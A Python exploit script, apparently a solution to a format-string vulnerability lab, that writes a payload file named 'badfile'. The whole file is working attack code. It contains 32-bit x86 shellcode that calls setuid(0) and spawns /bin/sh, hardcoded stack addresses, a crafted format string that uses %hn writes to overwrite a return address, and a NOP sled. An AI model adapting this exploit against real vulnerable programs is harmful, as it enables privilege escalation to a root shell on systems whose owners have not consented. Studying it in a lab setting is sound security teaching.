#!/usr/bin/python3
import sys

# This shellcode creates a local shell
local_shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

N = 200

# Put the address of return address at the beginning
addr = 0xffffd088 + 4
payload =  (addr + 2).to_bytes(4,byteorder='little')
payload += ("@@@@").encode('latin-1')
payload += (addr).to_bytes(4,byteorder='little')

target = 0xffffd0a4 + 0x90
high, low = (target & 0xffff0000) >> 16, target & 0xffff

# For investigation purpose (trial and error)
# s = "%.8x|" * 30 + "\n"
# s = "%.8x|" * 16 + "%n" + "\n"

# Construct the format string
offset1 = high - 12 - 15 * 8
offset2 = (low | 0x10000) - high if high >= low else low - high
s = "%.8x" * 15 + "%." + str(offset1) + "x" + "%hn" + "%." + str(offset2) + "x" + "%hn" + "\n"
payload += (s).encode('latin-1')

payload += bytearray(0x90 for _ in range(N - len(payload) - len(local_shellcode)))
payload += local_shellcode

# Write the payload to badfile
with open("badfile", "wb") as f:
  f.write(payload)

